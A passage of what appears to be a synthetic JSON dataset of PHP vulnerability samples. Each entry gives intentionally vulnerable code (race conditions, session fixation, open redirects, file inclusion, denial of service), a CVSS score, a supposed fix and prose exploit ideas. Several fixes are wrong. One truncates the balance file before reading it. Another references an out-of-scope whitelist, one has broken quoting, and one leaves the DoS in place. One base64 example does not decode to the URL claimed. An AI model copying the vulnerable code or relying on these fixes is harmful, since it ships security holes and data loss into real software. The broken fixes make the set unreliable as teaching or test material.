        "fixed_code": "<?php\nclass FileManager {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = $path;\n    }\n\n    public function writeToFile($data) {\n        file_put_contents($this->filePath, $data, LOCK_EX);\n    }\n\n    public function appendToFile($data) {\n        file_put_contents($this->filePath, $data, FILE_APPEND | LOCK_EX);\n    }\n}",
        "exploit_ways": [
            "An attacker could exploit the race condition to corrupt the file by writing conflicting data simultaneously.",
            "By manipulating file access timing, an attacker might inject malicious content into a configuration or log file.",
            "Race conditions can lead to unauthorized modifications if multiple processes attempt to write to the same file without proper locking mechanisms."
        ]
    },
    "php_28": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "<?php\nfunction logUserAccess($userId) {\n    $logFile = '/var/log/user_access.log';\n    $userData = shell_exec('grep \\'\" . escapeshellarg($userId) . \"\\' /etc/passwd');\n    file_put_contents($logFile, $userData, FILE_APPEND);\n}",
        "cvss_score": 4.2,
        "fixed_code": "<?php\nfunction logUserAccess($userId) {\n    $logFile = '/var/log/user_access.log';\n    $lines = file('/etc/passwd', FILE_IGNORE_NEW_LINES);\n    foreach ($lines as $line) {\n        if (strpos($line, $userId) !== false) {\n            file_put_contents($logFile, $line . \"\\n\", FILE_APPEND);\n            break;\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could provide a user ID that includes special characters to leak additional information from /etc/passwd.",
            "By crafting the input carefully, an attacker might be able to retrieve unexpected or sensitive lines from system files.",
            "The vulnerability might allow for local file reading if the input is not properly sanitized, leading to information disclosure."
        ]
    },
    "php_29": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "<?php\nclass FileManager {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = $path;\n    }\n\n    public function writeToFile($data) {\n        file_put_contents($this->filePath, $data);\n    }\n\n    public function readFromFile() {\n        return file_get_contents($this->filePath);\n    }\n}\n?>",
        "cvss_score": 4.3,
        "fixed_code": "<?php\nclass FileManager {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = $path;\n    }\n\n    public function writeToFile($data) {\n        file_put_contents($this->filePath, $data, LOCK_EX);\n    }\n\n    public function readFromFile() {\n        return file_get_contents($this->filePath);\n    }\n}\n?>",
        "exploit_ways": [
            "An attacker could race to modify the file between checks by two different processes.",
            "In a multi-user environment, one user could overwrite another's data by writing simultaneously.",
            "A malicious script could be triggered by concurrent read/write operations leading to data corruption."
        ]
    },
    "php_30": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "<?php\nfunction updateBalance($userId, $amount) {\n    $file = fopen('balances.txt', 'r+');\n    flock($file, LOCK_SH);\n    $balances = file_get_contents('balances.txt');\n    $balancesArray = json_decode($balances, true);\n    if (!isset($balancesArray[$userId])) {\n        $balancesArray[$userId] = 0;\n    }\n    $balancesArray[$userId] += $amount;\n    flock($file, LOCK_UN);\n    rewind($file);\n    fwrite($file, json_encode($balancesArray));\n    fclose($file);\n}",
        "cvss_score": 5.3,
        "fixed_code": "<?php\nfunction updateBalance($userId, $amount) {\n    $file = fopen('balances.txt', 'r+');\n    flock($file, LOCK_EX);\n    ftruncate($file, 0);\n    rewind($file);\n    $balances = file_get_contents('balances.txt');\n    $balancesArray = json_decode($balances, true) ?: [];\n    if (!isset($balancesArray[$userId])) {\n        $balancesArray[$userId] = 0;\n    }\n    $balancesArray[$userId] += $amount;\n    fwrite($file, json_encode($balancesArray));\n    flock($file, LOCK_UN);\n    fclose($file);\n}",
        "exploit_ways": [
            "Multiple concurrent requests could lead to inconsistent balance updates due to shared access.",
            "An attacker could manipulate the file's contents between read and write operations, leading to incorrect balances.",
            "Timing attacks might be used to guess when locks are released, potentially allowing for more effective exploitation."
        ]
    },
    "php_31": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "<?php\n\\nclass FileHandler {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = $path;\n    }\n\n    public function writeToFile($data) {\n        if (file_exists($this->filePath)) {\n            sleep(1); // Simulate delay\n            file_put_contents($this->filePath, $data);\n        } else {\n            throw new Exception(\"File not found.\");\n        }\n    }\n}",
        "cvss_score": 4.5,
        "fixed_code": "<?php\n\\nclass FileHandler {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = $path;\n    }\n\n    public function writeToFile($data) {\n        $lockFile = $this->filePath . '.lock';\n        $fp = fopen($lockFile, 'c');\n        if (flock($fp, LOCK_EX)) { // acquire an exclusive lock\n            file_put_contents($this->filePath, $data);\n            flock($fp, LOCK_UN); // release the lock\n        }\n        fclose($fp);\n    }\n}",
        "exploit_ways": [
            "An attacker could create a race condition by rapidly deleting and recreating the target file, causing data corruption.",
            "By exploiting the delay in writing to the file, an attacker might overwrite the file with malicious content if another process writes at the same time.",
            "If the file path can be controlled or predicted, an attacker might attempt to write to a different file by racing against the file existence check."
        ]
    },
    "php_32": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "<?php\nfunction set_session_id($user_id) {\n    session_start();\n    $_SESSION['user_id'] = $user_id;\n}\n?>",
        "cvss_score": 2.1,
        "fixed_code": "<?php\nfunction set_session_id($user_id) {\n    session_start();\n    session_regenerate_id(true);\n    $_SESSION['user_id'] = $user_id;\n}\n?>",
        "exploit_ways": [
            "An attacker could provide a fixed session ID in the URL to hijack an authenticated user's session.",
            "By manipulating the session cookie, an attacker can maintain control over a user's session even after login.",
            "If the application does not regenerate session IDs upon login, an attacker with knowledge of a valid session ID can impersonate users."
        ]
    },
    "php_33": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "<?php\nfunction processRequest() {\n    $data = file_get_contents('php://input');\n    if ($data) {\n        // Simulate processing data which could be slow for large input\n        sleep(10);\n        echo \"Processed\";\n    }\n}\nprocessRequest();\n?>",
        "cvss_score": 4.3,
        "fixed_code": "<?php\nfunction processRequest() {\n    $data = file_get_contents('php://input');\n    if ($data) {\n        // Limit processing time to prevent DoS\n        set_time_limit(5);\n        // Simulate processing data\n        sleep(min(strlen($data) / 10, 5));\n        echo \"Processed\";\n    }\n}\nprocessRequest();\n?>",
        "exploit_ways": [
            "An attacker can send a very large payload to force the script to sleep for a long time, tying up server resources.",
            "Repeated requests with payloads causing the script to sleep can exhaust server capacity, leading to service unavailability.",
            "By sending multiple large payloads in quick succession, an attacker can degrade performance and disrupt legitimate users' access."
        ]
    },
    "php_34": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "<?php\nfunction processRequest($data) {\n    $decodedData = json_decode(base64_decode($data), true);\n    if ($decodedData['action'] === 'sleep') {\n        sleep(10);\n    }\n}\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    processRequest($_POST['payload']);\n}",
        "cvss_score": 3.4,
        "fixed_code": "<?php\nfunction processRequest($data) {\n    $decodedData = json_decode(base64_decode($data), true);\n    if (isset($decodedData['action']) && $decodedData['action'] === 'sleep') {\n        sleep(2); // Reduced sleep time to mitigate DoS risk\n    }\n}\nif ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['payload'])) {\n    processRequest($_POST['payload']);\n}",
        "exploit_ways": [
            "An attacker could send multiple requests with payload containing {\"action\":\"sleep\"} to consume server resources.",
            "Crafting large JSON payloads can cause the server to spend excessive time decoding, leading to a denial of service.",
            "Sending malformed base64 strings as payload can trigger unexpected behavior and resource consumption."
        ]
    },
    "php_35": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "<?php\nfunction processRequest() {\n    $data = json_decode(file_get_contents('php://input'), true);\n    if (isset($data['delay'])) {\n        sleep(intval($data['delay']));\n    }\n}\nprocessRequest();\n?>",
        "cvss_score": 3.5,
        "fixed_code": "<?php\nfunction processRequest() {\n    $data = json_decode(file_get_contents('php://input'), true);\n    if (isset($data['delay'])) {\n        $maxDelay = 5; // Set a maximum delay time\n        $delay = intval($data['delay']);\n        if ($delay >= 0 && $delay <= $maxDelay) {\n            sleep($delay);\n        }\n    }\n}\nprocessRequest();\n?>",
        "exploit_ways": [
            "An attacker can send a large delay value to cause the server to hang for an extended period.",
            "By continuously sending requests with high delay values, the server's resources can be exhausted.",
            "Sending multiple requests simultaneously with long delays can create a denial-of-service condition."
        ]
    },
    "php_36": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "<?php\nfunction updateBalance($userId, $amount) {\n    $balance = file_get_contents(\"balances/$userId.txt\");\n    $newBalance = $balance + $amount;\n    sleep(1); // Simulating a delay\n    file_put_contents(\"balances/$userId.txt\", $newBalance);\n}",
        "cvss_score": 4.5,
        "fixed_code": "<?php\nfunction updateBalance($userId, $amount) {\n    $filePath = \"balances/$userId.txt\";\n    $lockFile = fopen($filePath . \".lock\", \"c\");\n    if (flock($lockFile, LOCK_EX)) {\n        $balance = file_get_contents($filePath);\n        $newBalance = $balance + $amount;\n        sleep(1); // Simulating a delay\n        file_put_contents($filePath, $newBalance);\n        flock($lockFile, LOCK_UN);\n    }\n    fclose($lockFile);\n}",
        "exploit_ways": [
            "Multiple concurrent requests could lead to inconsistent balance updates.",
            "An attacker might manipulate the timing of their requests to double credit transactions.",
            "In rare cases, an attacker could exploit the delay to corrupt the file contents by interrupting writes."
        ]
    },
    "php_37": {
        "vulnerability_type": "Session Fixation",
        "vulnerability_code": "<?php\nsession_start();\nif (!isset($_SESSION['user_id'])) {\n    if (isset($_GET['PHPSESSID'])) {\n        session_id($_GET['PHPSESSID']);\n        session_start();\n    }\n}\n$_SESSION['authenticated'] = true;\necho 'Session started. User authenticated.';\n?>",
        "cvss_score": 4.0,
        "fixed_code": "<?php\nsession_start();\nif (!isset($_SESSION['user_id'])) {\n    session_regenerate_id(true);\n}\n$_SESSION['authenticated'] = true;\necho 'Session started. User authenticated.';\n?>",
        "exploit_ways": [
            "An attacker can create a session with their own PHPSESSID and trick the user into using it, thus taking over the user's session.",
            "Attackers can use URL parameters to fixate sessions on legitimate users, gaining unauthorized access if the user logs in.",
            "By manipulating the PHPSESSID parameter, attackers could attempt to predict or brute-force valid session IDs, leading to session hijacking."
        ]
    },
    "php_38": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "<?php\n\\nclass User {\n    private $secret;\n\n    public function __construct($secret) {\n        $this->secret = $secret;\n    }\n\n    public function displaySecret() {\n        echo $this->secret;\n    }\n}\n$user = new User(\"Sensitive Information\");\necho $user->displaySecret();\n?>",
        "cvss_score": 2.5,
        "fixed_code": "<?php\n\nclass User {\n    private $secret;\n\n    public function __construct($secret) {\n        $this->secret = $secret;\n    }\n\n    public function displaySecret() {\n        // Secret should not be displayed\n    }\n}\n$user = new User(\"Sensitive Information\");\n// Removed echo statement to prevent information disclosure\n?>",
        "exploit_ways": [
            "An attacker could access the script and view sensitive information directly.",
            "If part of a larger application, an attacker might exploit this to obtain database credentials or other secrets.",
            "In environments with error logging enabled, the secret could be logged unintentionally if exceptions occur."
        ]
    },
    "php_39": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "<?php\n$url = $_GET['url'];\nheader('Location: ' . $url);\nexit();\n?>",
        "cvss_score": 6.5,
        "fixed_code": "<?php\n$allowed_urls = ['https://example.com/page1', 'https://example.com/page2'];\n$url = $_GET['url'];\nif (in_array($url, $allowed_urls)) {\n    header('Location: ' . $url);\n} else {\n    header('Location: https://example.com/default');\n}\nexit();\n?>",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by setting the url parameter, e.g., https://attacker.com.",
            "Could use the vulnerability to bypass intended security measures by redirecting to unauthorized URLs.",
            "Inject crafted URLs that lead to phishing pages designed to steal user credentials."
        ]
    },
    "php_40": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "<?php\nfunction safeRedirect($url) {\n    $allowedHosts = ['example.com', 'sub.example.com'];\n    $parsedUrl = parse_url($url);\n    if (in_array($parsedUrl['host'], $allowedHosts)) {\n        header('Location: ' . htmlspecialchars($url));\n        exit;\n    }\n}\n\nif (isset($_GET['redirect'])) {\n    $target = $_GET['redirect'];\n    safeRedirect($target);\n}\necho \"No redirection requested.\";",
        "cvss_score": 6.5,
        "fixed_code": "<?php\nfunction safeRedirect($url) {\n    $allowedHosts = ['example.com', 'sub.example.com'];\n    $parsedUrl = parse_url($url);\n    if (in_array($parsedUrl['host'], $allowedHosts)) {\n        header('Location: ' . filter_var($url, FILTER_SANITIZE_URL));\n        exit;\n    }\n}\n\nif (isset($_GET['redirect'])) {\n    $target = $_GET['redirect'];\n    safeRedirect($target);\n}\necho \"No redirection requested.\";",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site using a crafted URL parameter.",
            "Could exploit the vulnerability to trick users into visiting phishing sites by manipulating the 'redirect' parameter.",
            "May attempt to use protocol-relative URLs or other URI schemes to perform unexpected redirects."
        ]
    },
    "php_41": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "<?php\r\nclass SecureApp {\r\n    public function displayPage() {\r\n        echo '<html><head><title>Secure Page</title></head><body><h1>Welcome!</h1></body></html>';\r\n    }\r\n}\r\n$app = new SecureApp();\r\n$app->displayPage();?>",
        "cvss_score": 4.2,
        "fixed_code": "<?php\r\nclass SecureApp {\r\n    public function displayPage() {\r\n        header('Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.example.com; object-src 'none';');\r\n        header('X-Frame-Options: SAMEORIGIN');\r\n        header('X-XSS-Protection: 1; mode=block');\r\n        header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');\r\n        echo '<html><head><title>Secure Page</title></head><body><h1>Welcome!</h1></body></html>';\r\n    }\r\n}\r\n$app = new SecureApp();\r\n$app->displayPage();?>",
        "exploit_ways": [
            "An attacker can inject malicious scripts into the page to perform XSS attacks.",
            "The absence of Content Security Policy allows loading of external, potentially harmful resources.",
            "Without X-Frame-Options or frame-ancestors CSP directive, the site may be framed in a clickjacking attack."
        ]
    },
    "php_42": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "class SlowClass {\n    public function slowMethod() {\n        while(true) {}\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "class SafeClass {\n    public function safeMethod() {\n        // Add a timeout or condition to break the loop\n        for ($i = 0; $i < 1000; $i++) {}\n    }\n}",
        "exploit_ways": [
            "An attacker can call slowMethod, causing the server to become unresponsive.",
            "In a web application context, this could lead to excessive resource consumption and denial of service for other users.",
            "If part of a background task or cron job, it could indefinitely lock up system resources."
        ]
    },
    "php_43": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "<?php echo $_SERVER['PHP_SELF']; ?>",
        "cvss_score": 3.5,
        "fixed_code": "<?php // Removed direct output of server variable to prevent info disclosure ?>",
        "exploit_ways": [
            "An attacker can retrieve the full path of the current script, aiding in reconnaissance.",
            "This could be part of a larger attack where the script path is used to craft other attacks or locate other scripts on the server.",
            "By knowing the exact file location, attackers might guess other filenames or directories using directory traversal techniques."
        ]
    },
    "php_44": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "<?php $file = $_GET['file']; if (strpos($file, '..') === false && file_exists($file)) { include($file); } ?>",
        "cvss_score": 4.2,
        "fixed_code": "<?php $allowed_files = ['index.php', 'about.php', 'contact.php']; $file = $_GET['file']; if (in_array($file, $allowed_files) && file_exists($file)) { include($file); } ?>",
        "exploit_ways": [
            "An attacker can request a non-blacklisted file that resides on the server.",
            "If other PHP files are allowed but not listed, they could be included to leak sensitive information or execute code.",
            "Manipulating the 'file' parameter with URL encoding might bypass simple filters."
        ]
    },
    "php_45": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "<?php\nfunction safeRedirect($url) {\n    $whitelist = [\"http://example.com\", \"https://example.com\"];\n    if (in_array($url, $whitelist)) {\n        header(\"Location: \" . filter_var($url, FILTER_SANITIZE_URL));\n        exit();\n    }\n}\n\nif (isset($_GET['redirect'])) {\n    $userInput = $_GET['redirect'];\n    safeRedirect(base64_decode($userInput));\n}\necho 'No redirect requested.';\n?>",
        "cvss_score": 7.5,
        "fixed_code": "<?php\nfunction safeRedirect($url) {\n    $whitelist = [\"http://example.com\", \"https://example.com\"];\n    if (in_array($url, $whitelist)) {\n        header(\"Location: \" . filter_var($url, FILTER_SANITIZE_URL));\n        exit();\n    }\n}\n\nif (isset($_GET['redirect'])) {\n    $userInput = base64_decode($_GET['redirect']);\n    if (in_array($userInput, $whitelist)) {\n        safeRedirect($userInput);\n    } else {\n        echo 'Invalid redirect URL.';\n    }\n}\necho 'No redirect requested.';\n?>",
        "exploit_ways": [
            "An attacker can use a base64 encoded malicious URL like Y2F0ID9wYXNzd2Q= to attempt to redirect users to an unauthorized site.",
            "Crafting a base64 string that encodes 'https://malicious.com' could redirect legitimate users away from the intended site.",
            "Using obfuscated URLs in base64 could bypass simple checks and redirect to phishing sites."
        ]
    },
    "php_46": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "<?php\nfunction safeRedirect($url) {\n    $allowedHosts = [\"example.com\", \"sub.example.com\"];\n    $parsedUrl = parse_url($url);\n    if (in_array($parsedUrl['host'], $allowedHosts)) {\n        header(\"Location: \" . htmlspecialchars($url, ENT_QUOTES, 'UTF-8'));\n        exit;\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "<?php\nfunction safeRedirect($url) {\n    $allowedHosts = [\"example.com\", \"sub.example.com\"];\n    $parsedUrl = parse_url($url);\n    if (isset($parsedUrl['host']) && in_array($parsedUrl['host'], $allowedHosts)) {\n        header(\"Location: \" . htmlspecialchars($url, ENT_QUOTES, 'UTF-8'));\n        exit;\n    }\n}",
        "exploit_ways": [
            "An attacker can use a URL with an allowed host but malicious path to redirect users to a phishing site.",
            "Crafting a URL with port forwarding could redirect users to unintended services on the same domain.",
            "Using a URL with a fragment identifier to bypass checks and append malicious scripts or commands."
        ]
    },
    "php_47": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "<?php\nfunction safe_redirect($url) {\n    $whitelist = ['https:\\\\/\\\\/example\\\\.com'];\n    foreach ($whitelist as $pattern) {\n        if (preg_match(\"/^$pattern$/\", $url)) {\n            header('Location: ' . $url);\n            exit;\n        }\n    }\n    echo 'Invalid URL';\n}\nsafe_redirect($_GET['redirect']);\n?>",
        "cvss_score": 6.5,
        "fixed_code": "<?php\nfunction safe_redirect($url) {\n    $whitelist = ['https://example.com'];\n    if (in_array($url, $whitelist)) {\n        header('Location: ' . $url);\n        exit;\n    }\n    echo 'Invalid URL';\n}\nsafe_redirect($_GET['redirect']);\n?>",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by setting the 'redirect' parameter to an external URL.",
            "They could use URL encoding to bypass simple filters, e.g., https%3A%2F%2Fexample.com%2Fmalicious.",
            "Crafting URLs with additional parameters that trick the regex, like 'https://example.com/?malicious=true'."
        ]
    },
    "php_48": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "<?php\nfunction slow_function() {\n    $result = '';\n    for ($i = 0; $i < 1000000; $i++) {\n        $result .= md5($i);\n    }\n    return $result;\n}\necho slow_function();\n?>",
        "cvss_score": 3.7,
        "fixed_code": "<?php\nfunction optimized_function() {\n    $result = '';\n    for ($i = 0; $i < 1000000; $i++) {\n        $result .= md5($i);\n    }\n    return substr($result, 0, 100); // Returning a limited part of the result\n}\necho optimized_function();\n?>",
        "exploit_ways": [
            "An attacker can trigger this function via web requests to consume server resources.",
            "Repeatedly calling this function can lead to excessive CPU usage and slow down the server.",
            "If placed in a loop, it can cause the server to become unresponsive."
        ]
    },
    "php_49": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "class WebApp {\\n    public function render() {\\n        echo \"<html><head></head><body>Welcome to our site!</body></html>\";\\n    }\\n}",
        "cvss_score": 4.2,
        "fixed_code": "class WebApp {\\n    public function render() {\\n        header('Content-Security-Policy: default-src \\u0027self\\u0027');\\n        header('X-Content-Type-Options: nosniff');\\n        header('X-XSS-Protection: 1; mode=block');\\n        header('X-Frame-Options: SAMEORIGIN');\\n        echo \"<html><head></head><body>Welcome to our site!</body></html>\";\\n    }\\n}",
        "exploit_ways": [
            "An attacker can inject malicious scripts via reflected XSS.",
            "Clickjacking attacks could be performed since there is no X-Frame-Options header set.",
            "MIME type sniffing might occur as there is no X-Content-Type-Options header."
        ]
    }
}